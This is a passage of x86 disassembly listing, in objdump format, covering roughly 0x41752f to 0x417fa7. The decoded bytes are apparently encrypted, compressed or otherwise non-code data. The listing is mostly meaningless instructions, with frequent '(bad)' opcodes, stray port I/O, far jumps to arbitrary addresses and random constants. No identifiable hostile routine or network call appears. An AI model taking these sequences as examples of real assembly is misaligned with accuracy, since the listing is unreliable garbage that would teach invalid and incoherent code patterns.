  41752f:	jmp    0xaab6:0xe67defe6
  417536:	push   esi
  417537:	jge    0x4174d5
  417539:	mov    ecx,0xd4c8eab
  41753e:	out    0x65,al
  417540:	or     bl,al
  417542:	fidiv  DWORD PTR [edx]
  417544:	fcmovnu st,st(1)
  417546:	mov    ebx,0x236b54d1
  41754b:	ds cld 
  41754d:	xor    BYTE PTR [edx],0x55
  417550:	jbe    0x4174e1
  417552:	shl    DWORD PTR [edi+0x1a],0xa4
  417556:	push   ebx
  417557:	adc    DWORD PTR gs:[edx-0x50],0xd8e39cd5
  41755f:	xchg   esp,eax
  417560:	jb     0x41750c
  417562:	ds addr16 jge 0x4175a6
  417566:	out    dx,al
  417567:	lock mov al,ds:0xea3b9560
  41756d:	(bad)
  417570:	out    dx,eax
  417571:	xchg   ebx,eax
  417572:	mov    al,0xde
  417574:	pop    edi
  417575:	and    BYTE PTR [edi+0xb],ah
  417578:	xchg   edx,eax
  417579:	xor    al,0x46
  41757b:	mov    DWORD PTR [ecx+0x41451469],edi
  417581:	xchg   edx,eax
  417582:	push   0x17ef9d79
  417587:	shl    BYTE PTR [ebx+eax*1+0x40],1
  41758b:	dec    esp
  41758c:	push   0x715a467b
  417591:	(bad)  
  417592:	loopne 0x4175cb
  417594:	sub    al,0x6f
  417596:	fimul  WORD PTR [edx-0x57930a68]
  41759c:	stc    
  41759d:	rep outs dx,BYTE PTR ds:[esi]
  41759f:	or     dh,BYTE PTR [edi]
  4175a1:	retf   0x2480
  4175a4:	mov    ecx,0x712c3e76
  4175a9:	sbb    cl,BYTE PTR [ebx]
  4175ab:	mov    bh,0x35
  4175ad:	(bad)  
  4175ae:	ins    DWORD PTR es:[edi],dx
  4175af:	mov    cl,ah
  4175b1:	aaa    
  4175b2:	sub    eax,0x47cb
	...
  417613:	add    BYTE PTR [eax],al
  417615:	add    BYTE PTR [ecx-0x20b02c99],ch
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fsubr  st,st(6)
  417623:	xlat   BYTE PTR ds:[ebx]
  417624:	enter  0xf07a,0xf4
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [edx],ah
  41762f:	or     DWORD PTR [ecx+0x4e],esi
  417632:	mov    ebp,0xd8262ae1
  417637:	cmp    BYTE PTR [esi],dh
  417639:	stos   DWORD PTR es:[edi],eax
  41763a:	or     eax,0x2098f0f3
  41763f:	scas   al,BYTE PTR es:[edi]
  417640:	cmp    al,0xa
  417642:	xchg   ebx,eax
  417643:	adc    dl,al
  417645:	(bad)
  417648:	retf   
  417649:	mov    ebx,0xf38d4f86
  41764e:	mov    ebx,ebx
  417650:	jle    0x4175dc
  417652:	inc    eax
  417653:	push   ebx
  417654:	xor    DWORD PTR [edi+ebp*2],esp
  417657:	mul    ebp
  417659:	shr    BYTE PTR [ecx+ebp*2],cl
  41765c:	ds js  0x4176b9
  41765f:	inc    ebx
  417660:	xor    DWORD PTR [ecx-0x15],edi
  417663:	dec    ebp
  417664:	mov    ds:0xf2ce6a21,eax
  417669:	outs   dx,BYTE PTR ds:[esi]
  41766a:	jo     0x4176a3
  41766c:	xchg   ebp,eax
  41766d:	les    ecx,FWORD PTR [ecx-0x40]
  417670:	xor    esi,esi
  417672:	pop    ecx
  417673:	adc    al,0xd1
  417675:	in     al,0x77
  417677:	test   dh,dh
  417679:	jg     0x4176f4
  41767b:	sub    eax,0x742fbd0c
  417680:	loopne 0x41762c
  417682:	fwait
  417683:	and    eax,0xc666ba30
  417688:	(bad)  
  417689:	push   eax
  41768a:	mov    al,0x0
  41768c:	rol    ebx,cl
  41768e:	cmp    ch,BYTE PTR [ebx-0x656a30f8]
  417694:	dec    eax
  417695:	or     bl,BYTE PTR [edi+0x50d6f017]
  41769b:	add    BYTE PTR [ecx+0x13709685],ah
  4176a1:	jae    0x417674
  4176a3:	hlt    
  4176a4:	enter  0x81f8,0x93
  4176a8:	mov    esp,DWORD PTR [ecx-0x34de7495]
  4176ae:	popf   
  4176af:	or     BYTE PTR [ebx],ah
  4176b1:	mov    eax,0x86b60175
  4176b6:	add    bl,ah
  4176b8:	push   0xb9d3088
  4176bd:	fcomp  DWORD PTR [esi-0x4d]
  4176c0:	shl    DWORD PTR [edi+0x5f],1
  4176c3:	pop    ebp
  4176c4:	fcom   DWORD PTR [eax]
  4176c6:	sbb    eax,0x9cacea8f
  4176cb:	xchg   ebp,eax
  4176cc:	in     eax,dx
  4176cd:	retf   0x3eb4
  4176d0:	fild   QWORD PTR [edi]
  4176d2:	icebp  
  4176d3:	outs   dx,BYTE PTR ds:[esi]
  4176d4:	gs jae 0x4176ee
  4176d7:	jo     0x417688
  4176d9:	jb     0x41772f
  4176db:	or     DWORD PTR [ebp-0x1f02da34],eax
  4176e1:	addr16 test dl,0x92
  4176e5:	xchg   edx,eax
  4176e6:	push   ebp
  4176e7:	mov    ds:0xb89ecfe4,al
  4176ec:	jnp    0x4176da
  4176ee:	mov    cl,0xae
  4176f0:	mov    bl,0x36
  4176f2:	stc    
  4176f3:	xchg   ecx,eax
  4176f4:	div    esp
  4176f6:	dec    esi
  4176f7:	pusha  
  4176f8:	cli    
  4176f9:	sbb    eax,0x8423dc88
  4176fe:	pop    ecx
  4176ff:	cmp    ch,BYTE PTR [ebx-0x2b]
  417702:	mov    bl,0x26
  417704:	(bad)  
  417705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417706:	je     0x4176aa
  417708:	(bad)  
  41770a:	add    BYTE PTR [esi+0x4a],ah
  41770d:	mov    esi,0x33b409ce
  417712:	xchg   ebp,eax
  417713:	adc    DWORD PTR [ebp+0x64],esp
  417716:	add    esi,edx
  417718:	dec    ebp
  417719:	sbb    al,0x34
  41771b:	inc    edx
  41771c:	mov    esi,0xf9c70694
  417721:	jo     0x4176ea
  417723:	xchg   edi,eax
  417724:	mov    ebx,0x936a9774
  417729:	adc    esi,DWORD PTR [edx+0x68]
  41772c:	arpl   WORD PTR [edi+0x78],sp
  41772f:	out    dx,al
  417730:	sbb    DWORD PTR [edi+0x303a4f],esi
	...
  417796:	jmp    0xff5975a9
  41779b:	imul   ecx
  41779d:	(bad)  
  41779e:	mov    bh,0x89
  4177a0:	jmp    0x4177bb
  4177a2:	scas   al,BYTE PTR es:[edi]
  4177a3:	sbb    BYTE PTR [esi+eax*2+0xf5f7],cl
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    bl,ch
  4177af:	jae    0x4177e6
  4177b1:	mov    ecx,0x460eaa8
  4177b6:	pop    esi
  4177b7:	mov    ah,0xa3
  4177b9:	sub    al,0xaf
  4177bb:	mov    ebx,0x4c8cc4be
  4177c0:	popa   
  4177c1:	out    0xfc,al
  4177c3:	inc    esi
  4177c4:	test   al,0xa7
  4177c7:	js     0x41778a
  4177c9:	and    BYTE PTR [ebp+0x4faa5c31],ah
  4177cf:	inc    ebp
  4177d0:	cwde   
  4177d1:	sub    eax,0x29c01a30
  4177d6:	lds    esp,FWORD PTR [eax+esi*8-0x2d2a7464]
  4177dd:	mov    bh,0xd1
  4177df:	je     0x417834
  4177e1:	es cmp eax,0x4b416100
  4177e7:	mul    ebp
  4177e9:	pop    edx
  4177ea:	rcl    dh,0x32
  4177ed:	int    0xb6
  4177ef:	iret   
  4177f0:	mov    ah,0xbf
  4177f2:	mov    al,0xcb
  4177f4:	pushf  
  4177f5:	ds xchg esp,eax
  4177f7:	mov    ds:0x7bcf07a6,eax
  4177fc:	xchg   DWORD PTR ds:0x7ca7169c,ebp
  417802:	pop    ds
  417803:	inc    esp
  417804:	test   DWORD PTR [ebx+ecx*4+0x2e7f3fe2],esp
  41780b:	pop    es
  41780c:	int3   
  41780d:	lea    ebp,[eax*8+0x2c9ddf3d]
  417814:	mov    ch,0x43
  417816:	adc    eax,0x60ce211f
  41781b:	dec    ebp
  41781c:	ins    DWORD PTR es:[edi],dx
  41781d:	and    dl,BYTE PTR [edx]
  41781f:	cmc    
  417820:	inc    esp
  417821:	jne    0x4177ce
  417823:	rol    DWORD PTR [ebx+0x238522b8],0xc2
  41782a:	inc    esi
  41782b:	xchg   edx,eax
  41782c:	cmp    ebp,DWORD PTR cs:[edx+eiz*8+0x33ef53d5]
  417834:	into   
  417835:	pusha  
  417836:	std    
  417837:	lods   al,BYTE PTR ds:[esi]
  417838:	jmp    0x4057:0x35613f2b
  41783f:	jnp    0x417866
  417841:	mov    ebp,0x3f93412b
  417846:	in     eax,dx
  417847:	aaa    
  417848:	fdiv   st(4),st
  41784a:	xor    eax,0xbf84a192
  41784f:	jmp    0x68ae5007
  417854:	mov    bh,0x1a
  417856:	sar    DWORD PTR [ecx+eax*1+0x52],1
  41785a:	add    BYTE PTR [edx+0x65],0xb
  41785e:	out    dx,eax
  41785f:	sub    al,0x70
  417861:	and    DWORD PTR [esi-0x250111ea],edi
  417867:	jle    0x417846
  417869:	push   ds
  41786a:	cmp    esp,edi
  41786c:	inc    ebx
  41786d:	xor    DWORD PTR [esi-0x12],edx
  417870:	pop    edx
  417871:	in     eax,0xd1
  417873:	mov    ds:0x582f1925,eax
  417878:	loopne 0x4178ec
  41787a:	and    esp,ebp
  41787c:	sub    eax,0xcd2f0cee
  417881:	int    0x7c
  417883:	(bad)  
  417884:	mov    ?,eax
  417886:	shr    cl,cl
  417888:	mov    bl,BYTE PTR [edx+0x3b]
  41788b:	xchg   ebx,eax
  41788c:	mov    ebx,DWORD PTR [esi-0x5b]
  41788f:	fisub  DWORD PTR [edx]
  417891:	jns    0x4178be
  417893:	jl     0x4178c6
  417895:	mov    edi,0x6afd6947
  41789a:	inc    ecx
  41789c:	mov    esi,0xe35d66da
  4178a1:	cmp    edi,ecx
  4178a3:	fidiv  WORD PTR [ecx-0x63]
  4178a6:	daa    
  4178a7:	push   eax
  4178a8:	mov    es,ebx
  4178aa:	or     BYTE PTR [ecx],ch
  4178ac:	xchg   ecx,eax
  4178ad:	xor    eax,0xe25c1df4
  4178b2:	cmp    esp,DWORD PTR cs:[ebx+0x0]
	...
  417916:	pop    eax
  417917:	inc    ecx
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0xaf60e3bb
  417923:	imul   esp,ebp,0xffffff84
  417926:	(bad)  
  417927:	test   BYTE PTR [eax],0x0
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [ebp+0x38e61f6a],ch
  417933:	add    BYTE PTR [esi],bh
  417935:	push   edi
  417936:	dec    ebx
  417937:	jmp    0x41791a
  417939:	call   0x9052b259
  41793e:	mov    ds:0xe220c1ba,eax
  417943:	and    eax,DWORD PTR [ebx-0xc]
  417946:	pushw  0x1d41
  41794a:	sub    DWORD PTR [ecx-0x18],edi
  41794d:	int3   
  41794e:	fnstsw WORD PTR [ecx+0x395c2720]
  417954:	out    0x22,eax
  417956:	push   es
  417957:	test   al,0x5e
  417959:	stos   BYTE PTR es:[edi],al
  41795a:	push   edi
  41795b:	pusha  
  41795c:	mov    edx,0xb3268728
  417961:	mov    edi,0xdd6f3bce
  417966:	(bad)  
  417967:	add    DWORD PTR [ecx+edi*8-0x65],0x5e09344d
  41796f:	std    
  417970:	mov    edx,0xf9bd6ab1
  417975:	sub    al,0x29
  417977:	aam    0x34
  417979:	emms   
  41797b:	inc    eax
  41797c:	push   edx
  41797d:	mov    eax,0x1fc80f00
  417982:	mov    ebx,0x82beba42
  417987:	mov    al,0x2d
  417989:	out    dx,al
  41798a:	mov    gs,WORD PTR [eax-0x5f1a6f1c]
  417990:	or     bh,BYTE PTR [edi+edi*1]
  417993:	lods   eax,DWORD PTR ds:[esi]
  417994:	inc    edx
  417995:	pop    es
  417996:	adc    ah,BYTE PTR ds:0x3d2e4dff
  41799c:	lock das 
  41799e:	pushf  
  41799f:	xchg   ebp,eax
  4179a0:	pop    edx
  4179a1:	stc    
  4179a2:	shl    BYTE PTR [ebx-0x6c],1
  4179a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179a6:	inc    eax
  4179a7:	loop   0x41797a
  4179a9:	leave  
  4179aa:	pushf  
  4179ab:	inc    esi
  4179ac:	rcr    BYTE PTR ds:0x7cc0e42a,cl
  4179b2:	add    DWORD PTR [esi-0x3a675074],eax
  4179b8:	mov    al,0x4d
  4179ba:	xchg   ecx,eax
  4179bb:	xor    eax,0x8b387d
  4179c0:	cmp    edi,DWORD PTR ds:0x2d572db1
  4179c6:	inc    ecx
  4179c7:	mov    ah,0x47
  4179c9:	dec    ebp
  4179ca:	test   BYTE PTR [ecx-0x453b5633],cl
  4179d0:	and    al,bl
  4179d2:	adc    al,0x25
  4179d4:	ds sbb eax,0xa36a2a30
  4179da:	adc    al,BYTE PTR [edi-0x6a]
  4179dd:	cmp    eax,0x2be411d5
  4179e2:	sub    al,0xe1
  4179e4:	adc    BYTE PTR [edi+0x587384d8],ch
  4179ea:	dec    ecx
  4179eb:	out    0xf6,al
  4179ed:	push   ds
  4179ee:	(bad)  
  4179ef:	cmp    BYTE PTR [ebx-0xf],dl
  4179f2:	xchg   edi,eax
  4179f3:	lock add DWORD PTR [edx+0x2b],ebx
  4179f7:	mul    BYTE PTR [esi]
  4179f9:	jno    0x4179c7
  4179fb:	jnp    0x417a3a
  4179fd:	mov    ?,ebx
  4179ff:	in     al,0x79
  417a01:	ret    0x29ab
  417a04:	enter  0x7b3,0x18
  417a08:	mov    al,ds:0xd74650d8
  417a0d:	imul   eax,edi,0xe49c351a
  417a13:	in     al,dx
  417a14:	mov    al,ds:0xa511791f
  417a19:	leave  
  417a1a:	dec    esi
  417a1b:	pusha  
  417a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a1d:	jne    0x417a7b
  417a1f:	and    al,BYTE PTR [ecx-0x4b]
  417a22:	jle    0x417a06
  417a24:	or     al,0xa2
  417a26:	cmp    ebp,DWORD PTR [ecx+0xb]
  417a29:	mov    dl,dh
  417a2b:	xchg   esp,eax
  417a2c:	out    dx,al
  417a2d:	jnp    0x4179eb
  417a2f:	add    al,BYTE PTR [edx-0x61]
  417a32:	adc    al,0x94
  417a34:	add    DWORD PTR [eax],eax
	...
  417a96:	das    
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx-0xb]
  417aa3:	rcl    ch,cl
  417aa5:	lea    eax,ds:0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    cl,ah
  417aaf:	enter  0xf2c4,0xe0
  417ab3:	out    0x89,eax
  417ab5:	inc    ebx
  417ab6:	shl    DWORD PTR [ebx+eax*8-0x18454c0c],0x29
  417abe:	sar    DWORD PTR [edi+eiz*8+0x7b174734],0x2f
  417ac6:	popf   
  417ac7:	jbe    0x417a78
  417ac9:	aad    0x15
  417acb:	scas   al,BYTE PTR es:[edi]
  417acc:	call   0xf34:0x6df509c9
  417ad3:	cld    
  417ad4:	pusha  
  417ad5:	pop    esp
  417ad6:	mov    edi,0xcdef2cf8
  417adb:	enter  0x3407,0xf8
  417adf:	cdq    
  417ae0:	cli    
  417ae1:	data16 int3 
  417ae3:	xor    BYTE PTR [ebx+0x25],al
  417ae6:	push   ecx
  417ae7:	cmp    esi,DWORD PTR [edi+0x35]
  417aea:	daa    
  417aeb:	int3   
  417aec:	stos   DWORD PTR es:[edi],eax
  417aed:	mov    eax,ds:0xf98daa1c
  417af2:	test   BYTE PTR [ebp+0x76af4356],cl
  417af8:	es js  0x417a7f
  417afb:	lds    edx,FWORD PTR [ebp+0x6c]
  417afe:	add    ah,bh
  417b00:	push   ecx
  417b01:	test   DWORD PTR [edx-0x7a],0xc9a1a7a3
  417b08:	jae    0x417ae4
  417b0a:	and    al,0xe6
  417b0c:	lods   al,BYTE PTR ds:[esi]
  417b0d:	lds    edx,FWORD PTR [edx+0xd]
  417b10:	dec    esp
  417b11:	cmp    DWORD PTR [edi-0x40001102],ebx
  417b17:	mov    ecx,0x398b6397
  417b1c:	xor    al,0xc
  417b1e:	loop   0x417b94
  417b20:	das    
  417b21:	mov    esi,ebx
  417b23:	fld    QWORD PTR [esi+eiz*2-0x44]
  417b27:	retf   0x5400
  417b2a:	cmp    DWORD PTR [eax+0x71bcb2a3],eax
  417b30:	rcr    DWORD PTR [ecx],cl
  417b32:	outs   dx,BYTE PTR ds:[esi]
  417b33:	pop    ecx
  417b34:	jg     0x417af4
  417b36:	or     eax,0x7665d874
  417b3b:	mov    ch,BYTE PTR [bx]
  417b3e:	mov    al,0xe4
  417b40:	sub    DWORD PTR [eax+0x2802052a],0xffffff8e
  417b47:	lods   eax,DWORD PTR ds:[esi]
  417b48:	push   ss
  417b49:	xchg   ebp,eax
  417b4a:	jbe    0x417bc6
  417b4c:	mov    ds:0xa3ccb749,eax
  417b51:	(bad)  
  417b52:	loopne 0x417bcc
  417b54:	xchg   esp,eax
  417b55:	mov    dl,bh
  417b57:	and    DWORD PTR [ebp*2-0x4ed7aa95],0x9d2107fc
  417b62:	mov    ds:0x9c2ea57d,al
  417b67:	ins    BYTE PTR es:[edi],dx
  417b68:	sub    eax,ebx
  417b6a:	inc    BYTE PTR [eax+0x2663c698]
  417b70:	adc    eax,0x924de516
  417b75:	retf   
  417b76:	ret    0xfc26
  417b79:	sub    eax,0x6f95d717
  417b7e:	std    
  417b7f:	or     eax,0xa1ce27db
  417b84:	push   ss
  417b85:	xor    al,0x72
  417b87:	dec    edx
  417b88:	cdq    
  417b89:	adc    BYTE PTR [ecx],cl
  417b8b:	mov    cl,dl
  417b8d:	jns    0x417b25
  417b8f:	jbe    0x417b8a
  417b91:	lods   al,BYTE PTR ds:[esi]
  417b92:	push   ebp
  417b93:	adc    DWORD PTR [ecx],edx
  417b95:	fstp   TBYTE PTR [ebp+esi*2+0x59d5de4]
  417b9c:	int    0xf3
  417b9e:	jp     0x417be5
  417ba0:	test   eax,0x880645d7
  417ba5:	push   ss
  417ba6:	mov    dl,0xb5
  417ba8:	pop    ebp
  417ba9:	fs jbe 0x417b99
  417bac:	sub    bh,BYTE PTR es:[eax]
  417baf:	inc    ecx
  417bb0:	cld    
  417bb1:	sbb    BYTE PTR [edi-0x3c],0x61
	...
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0x3d
  417c23:	push   ecx
  417c24:	imul   DWORD PTR [edi+0xf90c]
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [ecx-0x59825117],bl
  417c33:	pop    esp
  417c34:	lea    ecx,[esi+0x46d65a91]
  417c3a:	jno    0x417cac
  417c3c:	fcomi  st,st(7)
  417c3e:	outs   dx,BYTE PTR ds:[esi]
  417c3f:	jmp    0x417c35
  417c41:	xor    al,0x4e
  417c43:	xor    BYTE PTR [eax],cl
  417c45:	out    dx,eax
  417c46:	mov    cl,0x6
  417c48:	out    dx,al
  417c49:	test   eax,0xf3d96c68
  417c4e:	stos   DWORD PTR es:[edi],eax
  417c4f:	in     al,0xc4
  417c51:	pop    esi
  417c52:	iret   
  417c53:	(bad)  
  417c54:	in     al,dx
  417c55:	push   esp
  417c56:	cs retf 0xd2b5
  417c5a:	adc    bh,ah
  417c5c:	aam    0xfa
  417c5e:	fidiv  WORD PTR [edx]
  417c60:	pop    edx
  417c61:	mov    cl,0x84
  417c63:	push   ds
  417c64:	jecxz  0x417bf8
  417c66:	pop    es
  417c67:	push   cs
  417c68:	rcl    DWORD PTR [eax+0x60c18a37],cl
  417c6e:	dec    ebx
  417c6f:	pop    ss
  417c70:	ss mov ebx,0x538f668b
  417c76:	je     0x417c37
  417c78:	mov    bl,BYTE PTR [ecx-0xff47400]
  417c7e:	(bad)  [edi+0x7f]
  417c81:	outs   dx,DWORD PTR ds:[esi]
  417c82:	ins    BYTE PTR es:[edi],dx
  417c83:	daa    
  417c84:	in     eax,0x10
  417c86:	pop    esp
  417c87:	out    0x85,al
  417c89:	mov    esi,0x924070ea
  417c8e:	out    0x20,eax
  417c90:	mov    ds:0xfc1a1224,eax
  417c95:	cpuid  
  417c97:	fist   DWORD PTR [ebx+ecx*2]
  417c9a:	and    esp,DWORD PTR [eax]
  417c9c:	out    dx,eax
  417c9d:	sub    DWORD PTR [eax+0x37],ecx
  417ca0:	pushf  
  417ca1:	(bad)  
  417ca2:	mov    al,ds:0xa507bec5
  417ca7:	cmp    ebx,DWORD PTR [ecx]
  417ca9:	dec    ecx
  417caa:	jo     0x417c96
  417cac:	cmp    al,0xc2
  417cae:	ds mov ch,bh
  417cb1:	div    BYTE PTR [esi]
  417cb3:	mov    edi,0xb00f7161
  417cb8:	adc    BYTE PTR [ecx-0x7277fd73],dh
  417cbe:	sub    al,ch
  417cc0:	cli    
  417cc1:	ds js  0x417c6b
  417cc4:	cld    
  417cc5:	inc    ebp
  417cc6:	into   
  417cc7:	mov    eax,0x3647f7c2
  417ccc:	(bad)  
  417ccd:	in     al,dx
  417cce:	pop    es
  417ccf:	addr16 sahf 
  417cd1:	mov    bh,0x82
  417cd3:	test   al,0x3d
  417cd5:	loopne 0x417d31
  417cd7:	enter  0x5153,0x96
  417cdb:	inc    ecx
  417cdc:	fisttp DWORD PTR [ecx]
  417cde:	add    eax,0xc6e8a7ce
  417ce3:	pop    eax
  417ce4:	cs jmp 0x11c731fe
  417cea:	in     eax,0x6f
  417cec:	imul   DWORD PTR [ebx+0x0]
  417cef:	push   ecx
  417cf0:	shl    DWORD PTR [ebx-0x13],0xc4
  417cf4:	sub    BYTE PTR [edi],ah
  417cf6:	imul   esi,edi,0x58c818a5
  417cfc:	retf   
  417cfd:	sub    eax,0x38ecad90
  417d02:	dec    eax
  417d03:	aas    
  417d04:	rcr    BYTE PTR [esi+0x28],cl
  417d07:	sbb    eax,DWORD PTR [edi]
  417d09:	mov    ds:0x89589e95,al
  417d0e:	aas    
  417d0f:	add    ebx,DWORD PTR [edi]
  417d11:	(bad)  
  417d12:	shl    al,0x62
  417d15:	or     eax,edi
  417d17:	(bad)  
  417d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d19:	xchg   esi,eax
  417d1a:	enter  0x4ab0,0x5c
  417d1e:	fsub   DWORD PTR [ecx+ecx*8-0x79]
  417d22:	daa    
  417d23:	daa    
  417d24:	xchg   ebp,eax
  417d25:	aam    0x2e
  417d27:	fwait
  417d28:	pop    ebp
  417d29:	xchg   edi,eax
  417d2a:	xchg   ah,bl
  417d2c:	jo     0x417cd4
  417d2e:	add    DWORD PTR [edx-0x3b4d8cb],0x52
	...
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x99
  417da3:	paddusb mm2,mm5
  417da6:	adc    edi,edx
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    BYTE PTR [ebp+0x7],bl
  417db0:	aad    0xbd
  417db2:	cld    
  417db3:	or     DWORD PTR [edx],esi
  417db5:	stos   DWORD PTR es:[edi],eax
  417db6:	and    DWORD PTR [ecx+0x10],ebx
  417db9:	imul   edi,DWORD PTR [ecx],0x428e8417
  417dbf:	icebp  
  417dc0:	js     0x417da9
  417dc2:	jg     0x417d7a
  417dc4:	dec    esp
  417dc5:	push   cs
  417dc6:	push   esp
  417dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dc9:	cmp    ebx,edi
  417dcb:	or     cl,ah
  417dcd:	adc    ah,dl
  417dcf:	jbe    0x417dba
  417dd1:	sti    
  417dd2:	xchg   ecx,eax
  417dd3:	out    0xbf,al
  417dd5:	mov    cl,0xce
  417dd7:	add    al,0x95
  417dd9:	fwait
  417dda:	shr    BYTE PTR [edi-0x1df3ff9d],0xbb
  417de1:	cmp    BYTE PTR ds:0xa6419c36,0xe0
  417de8:	cmp    esp,DWORD PTR [edx+0x64b77da2]
  417dee:	test   DWORD PTR [ecx],edi
  417df0:	ror    BYTE PTR [edi+0x6be0b50f],0xd5
  417df7:	xor    DWORD PTR [ebp-0x455f186f],ebp
  417dfd:	and    al,0xda
  417dff:	ja     0x417e47
  417e01:	push   esi
  417e02:	repz cmp al,0x2
  417e05:	es jg  0x417d92
  417e08:	mov    ds:0x276e6033,eax
  417e0d:	dec    ebp
  417e0e:	jecxz  0x417dcf
  417e10:	out    0x2d,al
  417e12:	mov    cl,BYTE PTR [esi-0x49]
  417e15:	iret   
  417e16:	xor    eax,0x9743c9a4
  417e1b:	dec    edx
  417e1c:	mov    ds:0x11ac58df,al
  417e21:	sbb    DWORD PTR [edi+0x3942c7fb],esp
  417e27:	dec    ebp
  417e28:	fiadd  DWORD PTR [esi+0x2f045e80]
  417e2e:	push   ecx
  417e2f:	arpl   WORD PTR [eax-0x79e2abb4],bx
  417e35:	ret    0xfc06
  417e38:	and    DWORD PTR [edi-0x23],edi
  417e3b:	dec    esi
  417e3c:	fs pop edi
  417e3e:	mov    dh,0xfa
  417e40:	jle    0x417e33
  417e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e43:	mov    esi,0xf979b1ca
  417e48:	adc    eax,0x32a182fb
  417e4d:	cld    
  417e4e:	jl     0x417e9f
  417e50:	inc    ebx
  417e51:	push   edi
  417e52:	out    0x0,al
  417e54:	(bad)  
  417e55:	fmul   QWORD PTR [edi+edx*8-0x59799568]
  417e5c:	mov    dh,0x2c
  417e5e:	mov    bl,0x31
  417e60:	mov    edx,0x4ccd213a
  417e65:	xor    al,0x1b
  417e67:	xor    al,0xde
  417e69:	out    0x22,eax
  417e6b:	into   
  417e6c:	and    ebx,eax
  417e6e:	stos   DWORD PTR es:[edi],eax
  417e6f:	sbb    al,0x37
  417e71:	dec    esp
  417e72:	call   DWORD PTR [edx+0x20186c18]
  417e78:	jo     0x417e9e
  417e7a:	push   ecx
  417e7b:	and    ebp,DWORD PTR [ecx+0x17]
  417e7e:	and    ebx,ebx
  417e80:	into   
  417e81:	loope  0x417ed0
  417e83:	xor    eax,0x4a7fa0f6
  417e88:	cwde   
  417e89:	icebp  
  417e8a:	jp     0x417e53
  417e8c:	cmp    DWORD PTR [ebx+edi*4],0xf1f0f953
  417e93:	xchg   edx,eax
  417e94:	out    dx,eax
  417e95:	aas    
  417e96:	lahf   
  417e97:	sbb    eax,0x422c67b9
  417e9c:	push   ecx
  417e9d:	cdq    
  417e9e:	xor    al,al
  417ea0:	in     al,dx
  417ea1:	ins    BYTE PTR es:[edi],dx
  417ea2:	ja     0x417ec8
  417ea4:	sub    eax,0x6e77325c
  417ea9:	jns    0x417ea8
  417eab:	push   esi
  417eac:	mov    ebp,DWORD PTR ds:0x7b41d74e
  417eb2:	shl    DWORD PTR ds:0x6f,1
	...
  417f14:	add    BYTE PTR [eax],al
  417f16:	(bad)  
  417f17:	out    0xe6,al
  417f19:	cmp    esp,esi
  417f1b:	cmp    edi,edi
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	out    dx,eax
  417f23:	test   eax,0xfb1a0b36
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [ecx+0x20939fec],bl
  417f33:	cmp    dh,BYTE PTR [ebx-0x3a6a6972]
  417f39:	add    ebx,DWORD PTR [esi-0x7d]
  417f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f3d:	mov    BYTE PTR [eax*2-0x283c32df],al
  417f44:	cmp    eax,0x10e0a614
  417f49:	into   
  417f4a:	sub    dl,bh
  417f4c:	addr16 xchg ebx,eax
  417f4e:	stos   DWORD PTR es:[edi],eax
  417f4f:	int    0xf5
  417f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f52:	xor    cl,BYTE PTR [esi+0x3cf40d2b]
  417f58:	cs nop
  417f5a:	(bad)  
  417f5b:	cmp    DWORD PTR [ebx+0x8fb59b4],edx
  417f61:	cli    
  417f62:	cdq    
  417f63:	cmp    al,0xa3
  417f65:	dec    esi
  417f66:	inc    eax
  417f67:	loop   0x417fd5
  417f69:	push   eax
  417f6a:	or     ah,bh
  417f6c:	aad    0xa9
  417f6e:	xor    edi,ebp
  417f70:	frstor [ecx-0x44dd5052]
  417f76:	(bad)  
  417f78:	fst    QWORD PTR [ebx]
  417f7a:	leave  
  417f7b:	mov    ch,0x71
  417f7d:	ins    DWORD PTR es:[edi],dx
  417f7e:	imul   edi,edi,0x2b5e75fe
  417f84:	dec    edx
  417f85:	outs   dx,DWORD PTR ds:[esi]
  417f86:	add    BYTE PTR [ebp-0x45],bl
  417f89:	and    ebx,esp
  417f8b:	jge    0x417fc3
  417f8d:	pop    esi
  417f8e:	sub    al,0x2d
  417f90:	mov    bh,ah
  417f92:	pop    ecx
  417f93:	icebp  
  417f94:	test   DWORD PTR [ecx+eiz*2],eax
  417f97:	mov    ecx,0xdce90955
  417f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f9d:	repz ret 
  417f9f:	pop    es
  417fa0:	test   eax,0x494ee314
  417fa5:	in     al,0x7f
  417fa7:	push   es
